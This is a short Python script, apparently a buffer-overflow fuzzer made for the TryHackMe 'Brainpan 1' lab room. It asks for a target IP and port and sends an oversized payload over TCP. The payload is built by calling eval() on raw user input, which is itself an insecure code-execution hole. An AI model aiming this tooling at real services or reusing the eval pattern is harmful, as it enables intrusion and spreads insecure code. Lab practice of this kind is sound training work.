import sys
import socket
from time import sleep

def display_banner():
    banner = r"""
                ___    __        
     ____  _  _<  /___/ /__      
    / __ \| |/_/ / __  / _ \     
   / /_/ />  </ / /_/ /  __/     
   \____/_/|_/_/\__,_/\___/      
    """
    print(banner)
    print("Author  : Ox1d3x3")
    print("Version : 0.7")
    print("Disclaimer: This fuzzer is made based on THM Brainpan 1 room.\n")

def get_target_info():
    try:
        ip = input("Enter the target IP address: ")
        port = int(input("Enter the target port: "))
        return ip, port
    except ValueError:
        print("Invalid input. Please enter a valid IP address and port.")
        sys.exit()

def main():
    display_banner()

    # Get user input for IP and port
    target_ip, target_port = get_target_info()

    print("\n[!] Enter your buffer payload below. Example: 'A' * 524 + 'B' * 4")
    try:
        user_input = input("Buffer payload: ")
        buffer = eval(user_input)  # Evaluating user input to create the buffer string
    except Exception as e:
        print(f"[!] Invalid buffer input: {e}")
        sys.exit()

    try:
        payload = buffer + '\r\n'
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        print(f"[+] Sending payload with size: {len(buffer)} bytes")
        s.send(payload.encode())
        s.close()
        print("[+] Payload sent successfully")
    except Exception as e:
        print(f"[!] Error sending payload: {e}")
        sys.exit()

if __name__ == "__main__":
    main()
